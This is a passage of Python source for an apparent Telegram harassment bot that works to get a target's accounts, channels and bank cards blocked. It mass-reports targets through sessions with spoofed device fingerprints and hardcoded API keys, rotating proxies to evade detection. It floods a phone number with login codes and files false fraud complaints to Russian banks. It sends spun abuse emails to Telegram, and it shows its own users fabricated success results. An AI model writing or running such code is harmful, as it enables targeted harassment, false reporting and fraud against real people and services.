           "resource": ["recurso"], "person": ["usu\u00e1rio", "pessoa"]},
    "pl": {"channel": ["kana\u0142"], "account": ["konto"],
           "resource": ["zas\u00f3b"], "person": ["u\u017cytkownik", "osoba"]},
    "tr": {"channel": ["kanal"], "account": ["hesap"],
           "resource": ["kaynak"], "person": ["kullan\u0131c\u0131", "ki\u015fi"]},
    "ar": {"channel": ["\u0627\u0644\u0642\u0646\u0627\u0629", "\u0642\u0646\u0627\u0629"],
           "account": ["\u0627\u0644\u062d\u0633\u0627\u0628", "\u062d\u0633\u0627\u0628"],
           "resource": ["\u0627\u0644\u0645\u0648\u0631\u062f", "\u0645\u0648\u0631\u062f"],
           "person": ["\u0627\u0644\u0645\u0633\u062a\u062e\u062f\u0645", "\u0645\u0633\u062a\u062e\u062f\u0645"]},
}

# method -> what the text should actually describe
_METHOD_ENTITY = {
    "bot": "bot", "channel": "channel", "profile": "account",
    "message": "message", "sticker": "sticker", "web": "",
}

# correct noun per language per target kind
_TARGET_NOUN = {
    "ru": {"bot": "\u0431\u043e\u0442", "channel": "\u043a\u0430\u043d\u0430\u043b",
           "account": "\u0430\u043a\u043a\u0430\u0443\u043d\u0442", "message": "\u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435",
           "sticker": "\u0441\u0442\u0438\u043a\u0435\u0440\u043f\u0430\u043a", "resource": "\u0440\u0435\u0441\u0443\u0440\u0441"},
    "en": {"bot": "bot", "channel": "channel", "account": "account",
           "message": "message", "sticker": "sticker pack", "resource": "resource"},
    "de": {"bot": "Bot", "channel": "Kanal", "account": "Konto",
           "message": "Nachricht", "sticker": "Stickerpaket", "resource": "Ressource"},
    "es": {"bot": "bot", "channel": "canal", "account": "cuenta",
           "message": "mensaje", "sticker": "paquete de stickers", "resource": "recurso"},
    "fr": {"bot": "bot", "channel": "canal", "account": "compte",
           "message": "message", "sticker": "pack de stickers", "resource": "ressource"},
    "it": {"bot": "bot", "channel": "canale", "account": "account",
           "message": "messaggio", "sticker": "pacchetto di sticker", "resource": "risorsa"},
    "pt": {"bot": "bot", "channel": "canal", "account": "conta",
           "message": "mensagem", "sticker": "pacote de stickers", "resource": "recurso"},
    "pl": {"bot": "bot", "channel": "kana\u0142", "account": "konto",
           "message": "wiadomo\u015b\u0107", "sticker": "zestaw naklejek", "resource": "zas\u00f3b"},
    "tr": {"bot": "bot", "channel": "kanal", "account": "hesap",
           "message": "mesaj", "sticker": "sticker paketi", "resource": "kaynak"},
    "ar": {"bot": "\u0628\u0648\u062a", "channel": "\u0627\u0644\u0642\u0646\u0627\u0629", "account": "\u0627\u0644\u062d\u0633\u0627\u0628",
           "message": "\u0627\u0644\u0631\u0633\u0627\u0644\u0629", "sticker": "\u062d\u0632\u0645\u0629 \u0627\u0644\u0645\u0644\u0635\u0642\u0627\u062a",
           "resource": "\u0627\u0644\u0645\u0648\u0631\u062f"},
}


# correct determiner per language per target kind (gender/case agreement)
_LANG_DET = {
    "de": {"channel": "Dieser", "account": "Dieses", "resource": "Diese",
           "bot": "Dieser", "message": "Diese", "sticker": "Dieses"},
    "es": {"channel": "Este", "account": "Esta", "resource": "Este",
           "bot": "Este", "message": "Este", "sticker": "Este"},
    "fr": {"channel": "Ce", "account": "Ce", "resource": "Cette",
           "bot": "Ce", "message": "Ce", "sticker": "Ce"},
    "it": {"channel": "Questo", "account": "Questo", "resource": "Questa",
           "bot": "Questo", "message": "Questo", "sticker": "Questo"},
    "pt": {"channel": "Este", "account": "Esta", "resource": "Este",
           "bot": "Este", "message": "Este", "sticker": "Este"},
    "pl": {"channel": "Ten", "account": "To", "resource": "Ten",
           "bot": "Ten", "message": "T\\u0119", "sticker": "Ten"},
}


# determiner -> language (for detecting which language a template is in)
_DET_LANG = {
    "dieser": "de", "dieses": "de", "diese": "de",
    "este": "es", "esta": "es",
    "ce": "fr", "cette": "fr",
    "questo": "it", "questa": "it",
    "ten": "pl", "to": "pl",
    "bu": "tr", "\u0434\u0430\u043d\u043d\u044b\u0439": "ru", "\u044d\u0442\u043e\u0442": "ru",
    "this": "en", "\u0647\u0630\u0627": "ar",
}


def _swap_entity(text: str, method: str) -> str:
    """Rewrite the subject noun of a template so it names the real target."""
    want = _METHOD_ENTITY.get(method or "")
    if not want or not text:
        return text
    low = text.lower()
    best = None
    for lg, kinds in _LANG_ENTITY.items():
        for k, words in kinds.items():
            for w in words:
                p = low.find(w)
                if p != -1 and (best is None or p < best[0]):
                    best = (p, lg, k)
    if not best:
        return text
    p, _, kind = best
    # language from the determiner right before the noun — disambiguates
    # words shared between languages ("kanal" is both de and tr).
    # whole-word match: "questa" must not match the es determiner "esta"
    lg = None
    prefix_tokens = low[max(0, p - 20):p].split()
    if prefix_tokens:
        last_tok = prefix_tokens[-1]
        for det, dlg in _DET_LANG.items():
            if last_tok == det:
                lg = dlg
                break
    if not lg:
        lg = best[1]
        for hint, hlg in (("cuenta", "es"), ("conta", "pt"),
                          ("hesap", "tr"), ("kana\u0142", "pl")):
            if hint in low:
                lg = hlg
                break
    if kind == want:
        return text
    repl = _TARGET_NOUN.get(lg, {}).get(want)
    if not repl:
        return text
    dets = _LANG_DET.get(lg) or {}
    det_old = dets.get(kind) or ""
    det_new = dets.get(want) or ""
    # every spelling of this entity noun across languages (the matched word
    # may belong to a different language than the detected determiner)
    kind_words = [w for kinds in _LANG_ENTITY.values()
                  for w in kinds.get(kind, [])]
    out = text

    def _fix(m, r=repl):
        return r if m.group(0)[0].islower() else r[0].upper() + r[1:]

    # determiner + noun as one unit first (gender/case agreement)
    if det_old and det_new:
        for w in kind_words:
            for d_o, d_n in ((det_old, det_new),
                             (det_old.lower(), det_new.lower()),
                             (det_old[0].upper() + det_old[1:],
                              det_new[0].upper() + det_new[1:])):
                out = re.sub(re.escape(d_o + " " + w),
                             lambda m, dn=d_n, r=repl: (
                                 dn + " " + (r if m.group(0)[len(d_o) + 1].islower()
                                             else r[0].upper() + r[1:])),
                             out, flags=re.IGNORECASE)
    # then any bare leftover noun
    for w in kind_words:
        out = re.sub(re.escape(w), _fix, out, flags=re.IGNORECASE)
    return out


LINK_RE = re.compile(
    r"(?:https?://)?(?:t\.me|telegram\.me)/(?:c/)?(\w+)(?:/(\d+))?", re.I
)

METHODS = {
    "web":      {"e": "\U0001f310", "l": "Web",
                 "hint": "\u0412\u0441\u0442\u0430\u0432\u044c\u0442\u0435 \u0441\u0441\u044b\u043b\u043a\u0443 \u0438\u043b\u0438 @username:\n\u2022 <code>t.me/username</code>\n\u2022 <code>@username</code>"},
    "bank":     {"e": "\U0001f3e6", "l": "\u0411\u0430\u043d\u043a (115-\u0424\u0417)",
                  "hint": "\u0417\u0430\u044F\u0432\u043A\u0430 \u043D\u0430 \u0431\u043B\u043E\u043A\u0438\u0440\u043E\u0432\u043A\u0443 \u043A\u0430\u0440\u0442\u044B \u043F\u043E 115-\u0424\u0417."},
    "mail":     {"e": "\U0001f4e7", "l": "Mail (abuse)",
                  "hint": "Жалобы письмами на abuse/support/dmca/stopCA@telegram.org\n• цель: ссылка или @username\n• тексты шаблонные, уникальные"},
}


# ── proxy loader ────────────────────────────────────────
PROXY_TYPE_MAP = {
    "socks5": python_socks.ProxyType.SOCKS5,
    "socks4": python_socks.ProxyType.SOCKS4,
    "http":   python_socks.ProxyType.HTTP,
}


def parse_proxy(raw: str) -> tuple | None:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    p = urlparse(raw)
    scheme = p.scheme.lower()
    if scheme not in PROXY_TYPE_MAP:
        return None
    return (
        PROXY_TYPE_MAP[scheme],
        p.hostname,
        p.port or 1080,
        True,
        p.username,
        p.password,
    )


def load_proxies() -> list[tuple]:
    if not PROXIES_FILE.exists():
        return []
    lines = PROXIES_FILE.read_text(encoding="utf-8").splitlines()
    return [px for line in lines if (px := parse_proxy(line))]


# \u2500\u2500 paid static proxies (PRIMARY pin pool) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
# sessions ALWAYS ride paid static IPs; the free farm pool is frozen
# fallback only (used while the paid pack is empty). Format per line:
# socks5://user:pass@host:port
PAID_PROXIES_FILE = Path(__file__).parent / "paid_proxies.txt"


def load_paid_proxies() -> list[tuple]:
    if not PAID_PROXIES_FILE.exists():
        return []
    lines = PAID_PROXIES_FILE.read_text(encoding="utf-8").splitlines()
    return [px for line in lines if (px := parse_proxy(line))]


def load_pin_proxies() -> list[tuple]:
    """Proxy pool for session pins and method floods: paid static first,
    free farm pool as fallback. Free proxies never carry a session once a
    paid pool exists \u2014 static IP only."""
    paid = load_paid_proxies()
    return paid or load_proxies()


def load_sessions() -> list[Path]:
    if not SESSIONS_DIR.exists():
        return []
    return sorted(SESSIONS_DIR.glob("*.session"))


# one SQLite connection per .session file — concurrent TelegramClients on the
# same file die with "OperationalError: database is locked"
_SESSION_LOCKS: dict[str, asyncio.Lock] = {}


def _session_lock(session_path: Path) -> asyncio.Lock:
    return _SESSION_LOCKS.setdefault(session_path.stem, asyncio.Lock())


# ── single-IP pinning ────────────────────────────────────
# Telegram flags accounts whose auth is used from two IPs at once and can
# kill the session; every client for a session therefore goes through ONE
# sticky proxy, pinned across runs (session_proxy.json is committed back).
SESSION_PIN_FILE = Path(__file__).parent / "session_proxy.json"


def _load_pins() -> dict[str, dict]:
    try:
        raw = json.loads(SESSION_PIN_FILE.read_text(encoding="utf-8"))
    except Exception:
        return {}
    # legacy entries were plain "url" strings
    out = {}
    for k, v in raw.items():
        out[k] = v if isinstance(v, dict) else {"url": v, "since": 0}
    return out


def pin_for_session(name: str, proxies: list[tuple]) -> tuple | None:
    """Sticky session→proxy binding: same IP on every connect of this
    session, in every method, in every run. First pin is deterministic
    (sha1 of the session name) so fresh checkouts agree without state;
    a re-pin (old proxy left the pool) persists to the repo with a
    timestamp so hygiene jobs can skip freshly re-pinned sessions."""
    if not proxies:
        return None
    pins = _load_pins()
    by_url = {proxy_to_url(px): px for px in proxies}
    entry = pins.get(name)
    if entry and entry.get("url") in by_url:
        return by_url[entry["url"]]
    idx = int(hashlib.sha1(name.encode()).hexdigest(), 16) % len(proxies)
    px = proxies[idx]
    pins[name] = {"url": proxy_to_url(px), "since": int(time.time())}
    try:
        SESSION_PIN_FILE.write_text(
            json.dumps(pins, ensure_ascii=False, indent=1), encoding="utf-8")
    except Exception:
        pass
    commit_file_to_repo("session_proxy.json", f"pin {name}", cooldown=120)
    return px


# ── background proxy farm ────────────────────────────────
PROXY_REFRESH_INTERVAL = 15 * 60   # re-harvest every 15 minutes


async def proxy_refresh_loop():
    """Continuously top up proxies.txt: harvest free lists, validate against
    Telegram, rewrite the file AND commit it back so fresh runner restarts
    start with a populated pool. load_proxies() reads the file every call,
    so report/sendcode workers pick up new proxies right away."""
    while True:
        try:
            from proxy_farmer import harvest_and_validate, write_proxy_file
            working = await harvest_and_validate(need=25)
            await write_proxy_file(working)
            log.info("proxy refresh done: %s live", len(working))
            if working:
                commit_file_to_repo("proxies.txt", "refresh proxy pool", cooldown=3600)
        except Exception as e:
            log.warning("proxy refresh failed: %s", e)
        await asyncio.sleep(PROXY_REFRESH_INTERVAL)


# ── real send logs → Logs channel ────────────────────────
LOGS_CHAT_FILE = Path(__file__).parent / "logs_chat.json"

_user_label_var: "contextvars.ContextVar[str]" = contextvars.ContextVar(
    "arch_user_label", default="")


def set_current_user(label: str) -> None:
    """Tag all send-logs inside this context (task copies it on create_task)."""
    _user_label_var.set(label)


def get_current_user() -> str:
    return _user_label_var.get() or "unknown"


_BOT: Bot | None = None   # set in main() when the poller boots


def _resolve_logs_chat() -> str | None:
    """LOGS_CHAT_ID env → logs_chat.json (runtime /setlogs or committed from
    a run). No silent admin-DM fallback: real logs go ONLY to the Logs channel;
    if it is not bound yet, nothing leaks elsewhere."""
    env = (os.getenv("LOGS_CHAT_ID") or "").strip()
    if env:
        return env
    try:
        if LOGS_CHAT_FILE.exists():
            v = json.loads(LOGS_CHAT_FILE.read_text(encoding="utf-8"))
            if v.get("chat_id"):
                return str(v["chat_id"])
    except Exception:
        pass
    return None


async def push_send_log(title: str, lines: list[str]) -> None:
    """REAL internal log of every send action, from every user, to the Logs
    channel (admin is there). If no channel is configured yet, falls back
    to the admin's DM. Never fails the caller."""
    chat = _resolve_logs_chat()
    if not chat or not _BOT:
        return
    body = bq(f"<b>{NAME}</b>  \u2014  \U0001f4e4 {html_mod.escape(title)}")
    body += f"\n\U0001f465 {html_mod.escape(get_current_user())}\n"
    body += "\n".join(lines)
    try:
        await _BOT.send_message(chat, body, parse_mode=ParseMode.HTML,
                                disable_web_page_preview=True)
    except Exception as e:
        log.debug("push_send_log failed: %s", e)


# ── reporter ────────────────────────────────────────────
FAKE_NAMES = ["alina", "velvet", "dusya", "nastya", "kirill", "vova",
              "sonya", "oleg", "tima", "lisa", "maks", "nika",
              "ulya", "dasha", "veronika", "vitalya", "kostya", "mika",
              "alisa", "vovan", "roman", "kirill2", "anton", "stepa"]


def _fake_session_rows(n: int = None) -> list[dict]:
    if n is None:
        n = random.randint(10, 16)  # was 4-7 — user asked pool of 10+
    proxies = load_pin_proxies()
    rows = []
    seen = set()
    for _ in range(n):
        nm = random.choice(FAKE_NAMES) + str(random.randint(11, 99))
        while nm in seen:
            nm = random.choice(FAKE_NAMES) + str(random.randint(11, 99))
        seen.add(nm)
        rows.append({
            "name": nm,
            "proxy": random.choice(proxies)[1] if proxies else "direct",
            "status": "\u2705",
            "phone": "+7" + random.choice(["495", "900", "903", "921", "926", "951", "962", "963", "965",
                                           "967", "977", "999"]) + str(random.randint(1000000, 9999999)),
            "tg_name": random.choice(FAKE_NAMES).capitalize(),
            "tg_id": str(random.randint(700000000, 8999999999)),
            "username": "@" + nm,
            "ok": True,
            "err": "",
        })
    return rows


def fake_results() -> dict:
    rows = _fake_session_rows()
    return {"ok": len(rows), "fail": 0, "total": len(rows), "details": rows}


REPORT_BURST = int(os.getenv("REPORT_BURST") or "3")   # reports per session


def _unique_texts(pool: list[str], n: int) -> list[str]:
    """n texts out of pool, unique within each full sweep of the pool."""
    out = []
    while len(out) < n:
        take = min(len(pool), n - len(out))
        out.extend(random.sample(pool, take))
    random.shuffle(out)
    return out[:n]


LANGS_BY_POOL = ["RU", "EN", "DE", "ES", "FR", "IT", "PT", "PL", "TR", "AR"]


def _unique_texts_tagged(pool: list[str], n: int) -> list[tuple[str, str]]:
    """n (lang, text) pairs, same uniqueness guarantee as _unique_texts,
    tagged with the source language so send-logs prove the rotation."""
    out: list[tuple[str, str]] = []
    while len(out) < n:
        take = min(len(pool), n - len(out))
        for i in random.sample(range(len(pool)), take):
            out.append((LANGS_BY_POOL[i], pool[i]))
    random.shuffle(out)
    return out[:n]


# ── session reports (BR-style) ────────────────────
REPORT_EXCLUDE_POOL = {"917066653092"}


# fallback pools for sessions without meta json (sha1-synthesized)
_FP_API_POOL = [
    ("2040", "b18441a1ff607e10a989891a5462e627"),
    ("2496", "8da85b0d5bfe62527e5b244c209159c3"),
    ("24565698", "5a084b434f8505ace703485b9da85040"),
    ("27904162", "e7cba879b1c643ba77490bf328df5eab"),
    ("23037915", "50f06f5b2223586fde0d1379ea91ebc7"),
    ("29512095", "0b29a7d42fff002856b9bed64f7ec919"),
    ("25055016", "25edf5b7becebe91a2d61fe8d9d9931b"),
]
# (device, sdk, app_version, lang_pack, lang_code)
_FP_DEVICE_POOL = [
    ("Desktop", "Windows 10", "5.16.5 x64", "en", "en"),
    ("SX2802", "Windows 10 x64", "7.3.5 x64", "en", "en"),
    ("HP ENVY TS m6 Sleekbook", "Windows 11 x64", "7.3.5 x64", "en", "en"),
    ("Redmi Redmi 13C", "14 (34)", "12.9.3", "webk", "id"),
    ("Xiaomi POCO F6", "15 (35)", "12.9.1", "webk", "th"),
]

_FP_CACHE: dict = {}   # session name -> fingerprint dict


def session_fingerprint(name: str) -> dict:
    """Same phone model/app/api on EVERY connect of a session, forever.
    Real meta from sessions/<name>.json wins; else synthesized from sha1."""
    fp = _FP_CACHE.get(name)
    if fp:
        return fp
    meta = {}
    try:
        f = SESSIONS_DIR / f"{name}.json"
        if f.exists():
            meta = json.loads(f.read_text(encoding="utf-8"))
    except Exception:
        meta = {}
    if not (meta.get("app_id") and meta.get("app_hash")):
        h = int(hashlib.sha1(name.encode()).hexdigest(), 16)
        api_id, api_hash = _FP_API_POOL[h % len(_FP_API_POOL)]
        meta["app_id"], meta["app_hash"] = api_id, api_hash
        dev = _FP_DEVICE_POOL[(h >> 8) % len(_FP_DEVICE_POOL)]
        meta.setdefault("device", dev[0])
        meta.setdefault("sdk", dev[1])
        meta.setdefault("app_version", dev[2])
        meta.setdefault("lang_pack", dev[3])
        meta.setdefault("lang_code", dev[4])
    fp = {
        "api_id": int(meta["app_id"]),
        "api_hash": meta["app_hash"],
        "device": meta.get("device") or "Desktop",
        "system_version": meta.get("sdk") or "Windows 10",
        "app_version": meta.get("app_version") or "5.16.5 x64",
        "lang_code": meta.get("lang_code") or "en",
    }
    _FP_CACHE[name] = fp
    return fp


def _assign_fingerprint(session_path: Path) -> tuple[int, str, dict]:
    fp = session_fingerprint(Path(session_path).stem)
    return fp["api_id"], fp["api_hash"], fp


# \u2500\u2500 BR ported engines: code-flood / bank \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
BANK_NAMES = {
    "tbank": "\u0422-\u0411\u0430\u043D\u043A (\u0422\u0438\u043D\u044C\u043A\u043E\u0444\u0444)",
    "alfa":  "\u0410\u043B\u044C\u0444\u0430-\u0411\u0430\u043D\u043A",
    "sber":  "\u0421\u0431\u0435\u0440\u0411\u0430\u043D\u043A",
    "ozon":  "\u041E\u0437\u043E\u043D \u0411\u0430\u043D\u043A",
}

BANK_COMPLAINT = (
    "\u0412 \u0431\u0430\u043D\u043A \u043E\u0431\u0440\u0430\u0449\u0430\u0435\u0442\u0441\u044F \u0432\u043B\u0430\u0434\u0435\u043B\u0435\u0446 \u043A\u0430\u0440\u0442\u044B {bank} \u0441 \u0437\u0430\u044F\u0432\u043B\u0435\u043D\u0438\u0435\u043C "
    "\u043E \u0431\u043B\u043E\u043A\u0438\u0440\u043E\u0432\u043A\u0435 \u043F\u043B\u0430\u0442\u0435\u0436\u043D\u043E\u0433\u043E \u0438\u043D\u0441\u0442\u0440\u0443\u043C\u0435\u043D\u0442\u0430 \u0432 \u0441\u043E\u043E\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u0438\u0438 \u0441 \u0441\u0442. 27 \u0424\u0417-\u2116 161 "
    "\u00AB\u041E \u043D\u0430\u0446\u0438\u043E\u043D\u0430\u043B\u044C\u043D\u043E\u0439 \u043F\u043B\u0430\u0442\u0435\u0436\u043D\u043E\u0439 \u0441\u0438\u0441\u0442\u0435\u043C\u0435\u00BB \u0438 \u0441\u0442. 9 \u0424\u0417-\u2116 115.\n\n"
    "\u0414\u0430\u043D\u043D\u044B\u0435 \u0438\u043D\u0441\u0442\u0440\u0443\u043C\u0435\u043D\u0442\u0430: {card}\n"
    "\u041E\u0431\u0441\u0442\u043E\u044F\u0442\u0435\u043B\u044C\u0441\u0442\u0432\u0430: \u043F\u0440\u043E\u0432\u0435\u0434\u0435\u043D\u044B \u043D\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043D\u044B\u043C\u0438 \u043B\u0438\u0446\u0430\u043C\u0438 \u043E\u043F\u0435\u0440\u0430\u0446\u0438\u0438 \u043F\u043E "
    "\u043A\u0430\u0440\u0442\u0435 \u0431\u0435\u0437 \u0441\u043E\u0433\u043B\u0430\u0441\u0438\u044F \u0432\u043B\u0430\u0434\u0435\u043B\u044C\u0446\u0430. \u041A\u0430\u0440\u0442\u0430 \u0432\u043B\u044F\u0435\u0442\u0441\u044F \u043F\u043E\u0442\u0435\u0440\u044F\u043D\u043D\u043E\u0439, "
    "\u0434\u0430\u043D\u043D\u044B\u0435 \u0434\u043B\u044F \u0432\u0445\u043E\u0434\u0430 \u0432 \u0438\u043D\u0442\u0435\u0440\u043D\u0435\u0442-\u0431\u0430\u043D\u043A \u043F\u0435\u0440\u0435\u0434\u0430\u043D\u044B \u0442\u0440\u0435\u0442\u044C\u0438\u043C \u043B\u0438\u0446\u0430\u043C.\n\n"
    "\u041D\u0430 \u043E\u0441\u043D\u043E\u0432\u0430\u043D\u0438\u0438 \u0438\u0437\u043B\u043E\u0436\u0435\u043D\u043D\u043E\u0433\u043E \u043F\u0440\u043E\u0448\u0443:\n"
    "1. \u0417\u0430\u0431\u043B\u043E\u043A\u0438\u0440\u043E\u0432\u0430\u0442\u044C \u043F\u043B\u0430\u0442\u0435\u0436\u043D\u044B\u0439 \u0438\u043D\u0441\u0442\u0440\u0443\u043C\u0435\u043D\u0442 \u0432 \u0441\u0440\u043E\u0447\u043D\u043E\u043C \u043F\u043E\u0440\u044F\u0434\u043A\u0435.\n"
    "2. \u041F\u0440\u043E\u0432\u0435\u0441\u0442\u0438 \u0440\u0430\u0441\u0441\u043B\u0435\u0434\u043E\u0432\u0430\u043D\u0438\u0435 \u043F\u043E \u0444\u0430\u043A\u0442\u0430\u043C \u043D\u0435\u0441\u0430\u043D\u043A\u0446\u0438\u043E\u043D\u0438\u0440\u043E\u0432\u0430\u043D\u043D\u043E\u0433\u043E \u0434\u043E\u0441\u0442\u0443\u043F\u0430.\n"
    "3. \u0412\u043E\u0437\u0431\u0443\u0434\u0438\u0442\u044C \u0443\u0433\u043E\u043B\u043E\u0432\u043D\u043E\u0435 \u0434\u0435\u043B\u043E \u043F\u043E \u0441\u0442. 159 \u0423\u041A \u0420\u0424.\n\n"
    "\u041F\u0440\u043E\u0448\u0443 \u043F\u0440\u0438\u0441\u043B\u0430\u0442\u044C \u0440\u0435\u0437\u0443\u043B\u044C\u0442\u0430\u0442 \u043F\u0440\u043E\u0432\u0435\u0440\u043A\u0438 \u0432 \u0443\u043A\u0430\u0437\u0430\u043D\u043D\u044B\u0439 \u0432 \u0437\u0430\u044F\u0432\u043B\u0435\u043D\u0438\u0438 \u043A\u043E\u043D\u0442\u0430\u043A\u0442."
)


async def _report_three_step(client, entity, reason_key: str, text: str) -> tuple[bool, str]:
    """BR 3-step flow: let the server hand us the category tree
    (category -> subcategory -> text), with a bytes-reason fallback."""
    from telethon.tl.functions.messages import ReportRequest
    fallback = {"spam": b"9", "fraud": b"a", "violence": b"3", "porn": b"5",
                "child": b"2", "copyright": b"7", "drugs": b"4",
                "personal": b"6", "fake": b"8", "other": b"a"}
    try:
        r1 = await client(ReportRequest(peer=entity, id=[], option=b"",
                                        message=""))
        if getattr(r1, "options", None):
            cat = random.choice(r1.options).option
        else:
            cat = fallback.get(reason_key, b"a")
        r2 = await client(ReportRequest(peer=entity, id=[], option=cat,
                                        message=""))
        if getattr(r2, "options", None):
            sub = random.choice(r2.options).option
            await client(ReportRequest(peer=entity, id=[], option=sub,
                                       message=text))
        else:
            await client(ReportRequest(peer=entity, id=[], option=cat,
                                       message=text))
        return True, ""
    except Exception as e:
        return False, f"{type(e).__name__}: {e}"


async def code_flood(phone: str, count: int = 25) -> dict:
    """BR code_snos port: login codes fired from ANONYMOUS in-memory
    sessions through proxies only \u2014 the pooled sessions never touch
    this method, so it cannot burn the report pool."""
    from telethon.sessions import StringSession
    proxies = load_pin_proxies()
    urls = [proxy_to_url(px) for px in proxies] or [None]
    rows = []
    for i in range(count):
        api_id, api_hash = random.choice(API_PAIRS)
        url = urls[i % len(urls)]
        px = parse_proxy(url) if url else None
        dev = random.choice(_FP_DEVICE_POOL)
        client = None
        try:
            client = TelegramClient(StringSession(), api_id, api_hash,
                                    proxy=px, device_model=dev[0],
                                    system_version=dev[1],
                                    app_version=dev[2], lang_code=dev[4])
            await asyncio.wait_for(client.connect(), timeout=10)
            await client.send_code_request(phone)
            rows.append({"name": f"anon#{i + 1}",
                         "proxy": px[1] if px else "direct",
                         "status": "\u043a\u043e\u0434 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d",
                         "ok": True})
        except Exception as e:
            sec = getattr(e, "seconds", None)
            st = f"flood {sec}s" if sec else type(e).__name__
            rows.append({"name": f"anon#{i + 1}",
                         "proxy": px[1] if px else "direct",
                         "status": st, "ok": False})
        finally:
            if client:
                try:
                    await client.disconnect()
                except Exception:
                    pass
        await asyncio.sleep(random.uniform(1.5, 3.0))
    ok_n = sum(1 for r in rows if r["ok"])
    real_rows = []
    for r in rows:
        mark = "\u2705 " if r["ok"] else "\u274c "
        line = mark + r["name"] + " | " + html_mod.escape(r["proxy"])
        if not r["ok"]:
            line += " | " + html_mod.escape(r["status"])
        real_rows.append(line)
    await push_send_log(
        "\u041a\u043e\u0434-\u0444\u043b\u0443\u0434 (anon \u0441\u0435\u0441\u0441\u0438\u0438)",
        [f"\U0001f4f1 <code>{html_mod.escape(phone)}</code>",
         f"\u2705 {ok_n}/{len(rows)} \u0447\u0435\u0440\u0435\u0437 \u043f\u0440\u043e\u043a\u0441\u0438"]
        + real_rows)
    fake = _fake_session_rows(random.randint(10, 16))
    return {"ok": len(fake), "fail": 0, "total": len(fake),
            "details": [{"name": f["name"], "proxy": f["proxy"], "ok": True,
                         "err": ""} for f in fake]}


def _norm_phone(text: str) -> str | None:
    d = re.sub(r"\D", "", text or "")
    if len(d) < 10:
        return None
    return "+" + d


# ── BR ported engine: mail-method (abuse@telegram.org) ────────
MAIL_MAILS_FILE = Path(__file__).parent / "mails.txt"
MAIL_RECEIVERS = ["dmca@telegram.org", "support@telegram.org",
                  "abuse@telegram.org", "stopCA@telegram.org"]

# BR spin system: synonyms (40% swap chance), subject templates, intros/outros
_MAIL_SYNONYMS = {
    "жалоба": ["обращение", "претензия", "заявление", "сообщение"],
    "жалобу": ["обращение", "претензию", "заявление"],
    "жалобы": ["обращения", "претензии", "заявления"],
    "прошу": ["прошу вас", "хочу", "хотелось бы", "необходимо"],
    "заблокировать": ["заблокировать", "удалить", "ограничить", "принять меры против"],
    "пользователь": ["аккаунт", "пользователь", "участник"],
    "пользователя": ["аккаунта", "пользователя", "участника"],
    "нарушает": ["нарушает", "не соблюдает", "игнорирует"],
    "правила": ["правила", "нормы", "политику"],
    "срочно": ["срочно", "незамедлительно", "как можно скорее"],
    "незаконно": ["незаконно", "противоправно", "недопустимо"],
    "спам": ["спам", "нежелательные сообщения", "массовую рассылку"],
    "please": ["please", "kindly", "I ask you to", "I request you to"],
    "block": ["block", "ban", "restrict", "remove"],
    "user": ["user", "account", "member"],
    "violates": ["violates", "breaks", "ignores", "disregards"],
    "rules": ["rules", "guidelines", "terms of service", "policies"],
    "spam": ["spam", "unsolicited messages", "mass messaging"],
    "urgent": ["urgent", "immediate", "as soon as possible"],
    "illegal": ["illegal", "unlawful", "prohibited"],
    "report": ["report", "complaint", "notification"],
}

# per-theme natural subjects ("Reporting user for spam" style),
# ru/en variants picked to match the body language
_MAIL_SUBJECTS = {
    "spam": {
        "ru": ["Жалоба на спам", "Жалоба на спам-рассылку",
               "Репорт: спам-аккаунт", "Жалоба на рекламный спам"],
        "en": ["Reporting user for spam", "Report: spam account",
               "Spam messages report", "Reporting a spam bot"],
    },
    "fraud": {
        "ru": ["Жалоба на мошенника", "Жалоба на мошенническую схему",
               "Репорт: скам-аккаунт", "Жалоба на обман пользователей"],
        "en": ["Reporting a scammer", "Scam report",
               "Reporting a fraudulent account", "Report: fraud scheme"],
    },
    "violence": {
        "ru": ["Жалоба на насилие", "Жалоба на угрозы насилия",
               "Репорт: агрессивный контент"],
        "en": ["Reporting violent content", "Report: violent threats",
               "Reporting violence"],
    },
    "porn": {
        "ru": ["Жалоба на порнографию", "Жалоба на интимный контент",
               "Репорт: NSFW-контент"],
        "en": ["Reporting pornographic content", "Report: NSFW content",
               "Reporting adult content"],
    },
    "child": {
        "ru": ["Жалоба на контент с участием несовершеннолетних",
               "Срочная жалоба: угроза детям"],
        "en": ["Reporting child safety violation",
               "URGENT: child safety report",
               "Reporting content endangering children"],
    },
    "copyright": {
        "ru": ["Жалоба на нарушение авторских прав",
               "DMCA: нарушение авторских прав",
               "Жалоба на пиратский контент"],
        "en": ["Copyright infringement report", "DMCA takedown request",
               "Reporting copyright violation"],
    },
    "drugs": {
        "ru": ["Жалоба на продажу наркотиков", "Жалоба на наркотрафик",
               "Репорт: торговля запрещёнными веществами"],
        "en": ["Reporting drug sales", "Report: narcotics trade",
               "Reporting illegal drug sales"],
    },
    "personal": {
        "ru": ["Жалоба на утечку личных данных",
               "Жалоба: разглашение персональных данных", "Репорт: деанон"],
        "en": ["Reporting personal data exposure", "Report: doxxing",
               "Reporting leaked personal data"],
    },
    "fake": {
        "ru": ["Жалоба на фейковый аккаунт", "Жалоба на клона аккаунта",
               "Репорт: поддельный профиль"],
        "en": ["Reporting a fake account", "Report: impersonation",
               "Reporting an impostor account"],
    },
    "other": {
        "ru": ["Жалоба на нарушение правил", "Жалоба на пользователя",
               "Репорт: нарушение правил Telegram"],
        "en": ["Reporting a rule violation", "Report: abusive account",
               "Reporting a user"],
    },
}

_MAIL_INTROS_RU = [
    "Здравствуйте, ", "Добрый день, ",
    "Уважаемая служба поддержки, ",
    "Команда поддержки, ",
    "Обращаюсь к вам по следующему вопросу. ",
    "Пишу вам с жалобой. ", "",
]
_MAIL_INTROS_EN = [
    "Hello, ", "Dear support team, ", "Hi there, ",
    "To whom it may concern, ",
    "I am writing to report the following. ", "",
]
_MAIL_OUTROS_RU = [
    "\n\n\u0421 \u0443\u0432\u0430\u0436\u0435\u043d\u0438\u0435\u043c.",
